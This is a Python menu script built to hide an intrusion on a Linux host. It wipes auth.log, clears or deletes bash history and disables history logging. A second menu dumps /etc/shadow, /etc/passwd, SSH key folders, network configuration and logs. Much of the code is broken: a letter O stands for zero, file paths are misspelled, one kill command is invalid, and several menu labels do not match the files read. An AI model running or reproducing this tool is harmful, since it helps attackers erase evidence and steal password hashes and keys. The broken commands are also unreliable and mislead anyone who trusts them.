import os
import time
import sys

lg = "[+]"
wrn = "[!]"

print("Hello! You got ...\n")
time.sleep(0.50)

#---[1]--------------------------------
print("What do you want to do?\n")      
#---[1]--------------------------------
print("[1] Clear file auth.log")
print("[2] Clear bash history of current user")
print("[3] Delete a file .bash_history")
print("[4] Clear the history of the current session\n    Set history max parameter value on lines 0")
print("[5] Set history max commands to 0")
print("[6] Disable history logging (you must be logged out to take effect)")
print("[7] End current session")
print("[8] Perrnanentlj sends all bash history commands to /dev/null")
print("[9] Extra menu")
print("[0] Exit the program")

clear = input("Select item: ")
def check_user_input(clear):
    if clear == "1":
        print('[!]File cleanup "auth.log"...')
        os.system('echo "" > /var/log/auth.log')
        print(lg, "File cleanup completed successfully!", lg)
        return
    elif clear == "2":
        print(wrn, "Clearing the user's bash history ...")
        os.system('echo "" ~/.bash_history')
        print(lg, "The bash cleanup was successful!", lg)
        return
    elif clear == "3":
        print(wrn, "Removal in progress .bash_history")
        os.system('rm ~/.bash history/ -rf')
        print(lg, "The deletion was successful!", lg)
        return
    elif clear == "4":
        print(wrn, "Clearing the history of the current session")
        os.system("history -c")
        print(lg, "Clearing history was successful!", lg)
        return
    elif clear == "5":
        print(wrn, "Bash user value from user")
        os.system("export HISTFILESIZE=O")
        print(lg,"Successfully!", lg)
        return
    elif clear == "6":
        print(wrn, "Disabling bash logging ...")
        os.system("export HISTSIZE=O")
        os.system("unset HISTFILE")
        print(lg, "Successfully!", lg)
        return
    elif clear == "7":
        print("Be healthy!")
        print(wrn, "Ending the current session ...", wrn)
        os.system("kill -9 &&")
        return
    elif clear == "8": 
        print(wrn, "Sending Files ...")
        os.system("ln /dev/null ~/.bash_history -sf")
        print(lg, "Successfully!", lg)
    elif clear == "9":
        print("One moment... \n")
        time.sleep(0.25)
        return
    elif clear == "0":
        sys.exit("Good Luck!")
    else:
        print("You entered the wrong value!")

check_user_input(clear)

class dop_menu:
    print("EXTRA MENU:\n")
    time.sleep(0.25)

    print("[1] View hashes of local users")
    print("[2] Local users")
    print("[3] Local groups")
    print("[4] Launch Services Service")
    print("[5] Known hostnames and IP addresses")
    print("[6] Fully qualified hostname with domain")
    print("[7] Network configuration")
    print("[8] System environment variables")
    print("[9] Vendor Search-MAC")
    print("[10] SSH Keystore")
    print("[11] System log files (most Linux) ((Logs))")
    print("[0] Back to the Menu\n")

view_top = input("Select item: ")

def check_user_input(view_top):
    if view_top == "1":
        os.system("cat /etc/shadow")
        return
    elif view_top == "2":
        os.system("cat /etc/passwd")
        return
    elif view_top == "3":
        os.system("cat /etc/group")
        return
    elif view_top == "4":
        os.system("cat /etc/rc.d")
        return
    elif view_top == "5":
        os.system("cat  /etc/init.d")
        return
    elif view_top == "6":
        os.system("cat /etc/hosts")
        return
    elif view_top == "7":
        os.system("cat /etc/HOSTNAME")
        return
    elif view_top == "8":
        os.system("cat /etc/network/interfaces")
        return
    elif view_top == "9":
        os.system("cat /usr/share/wireshark/manuf")
        return
    elif view_top == "10":
        os.system("cat -/.ssh/")
        return
    elif view_top == "11":
        os.system("cat /var/log")
        return
    elif view_top == "0":
        return
    else:
        print("You entered an invalid value!")
        return
check_user_input(view_top)
